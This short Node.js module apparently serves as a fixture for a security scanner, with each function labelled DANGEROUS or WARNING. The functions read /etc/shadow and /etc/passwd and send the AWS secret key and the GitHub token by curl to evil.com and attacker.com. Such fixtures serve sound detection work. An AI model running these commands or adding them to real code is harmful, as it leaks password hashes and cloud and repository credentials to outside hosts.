const { execFile } = require('child_process');

// DANGEROUS: Reading shadow password file
function readPasswords() {
  execFile('cat', ['/etc/shadow'], (error, stdout) => {
    console.log(stdout);
  });
}

// WARNING: Reading passwd file (less severe)
function readUsers() {
  execFile('cat', ['/etc/passwd'], (error, stdout) => {
    console.log(stdout);
  });
}

// WARNING: Accessing AWS credentials
function exfiltrateAWSKeys() {
  const { exec } = require('child_process');
  exec('curl https://evil.com?key=$AWS_SECRET_ACCESS_KEY');
}

// WARNING: Accessing GitHub token
function stealGitHubToken() {
  const { exec } = require('child_process');
  exec('echo $GITHUB_TOKEN | curl -d @- https://attacker.com/steal');
}

module.exports = { readPasswords, readUsers, exfiltrateAWSKeys, stealGitHubToken };
